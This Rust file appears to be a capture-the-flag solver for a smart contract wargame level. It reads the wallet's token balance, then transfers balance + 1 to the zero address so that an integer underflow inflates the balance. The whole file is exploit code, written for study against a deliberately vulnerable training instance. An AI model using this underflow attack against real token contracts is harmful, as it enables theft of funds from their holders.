use crate::types::*;
use crate::utils;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function transfer(address, uint) public returns (bool)
        function balanceOf(address) public view returns (uint)
    ]"#,
    event_derives(serde::Deserialize, serde::Serialize)
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let contract = LevelContract::new(level.instance.parse::<Address>()?, client.clone());

    let mut balance = contract
        .balance_of(client.default_sender().unwrap())
        .call()
        .await?;
    println!("balance: {}\n", balance);

    let receipt = contract
        .transfer(Address::zero(), balance + 1)
        .legacy()
        .send()
        .await?
        .await?;
    println!("transfer():\n{}\n", serde_json::to_string_pretty(&receipt)?);

    balance = contract
        .balance_of(client.default_sender().unwrap())
        .call()
        .await?;
    println!("balance: {}\n", balance);

    Ok(())
}
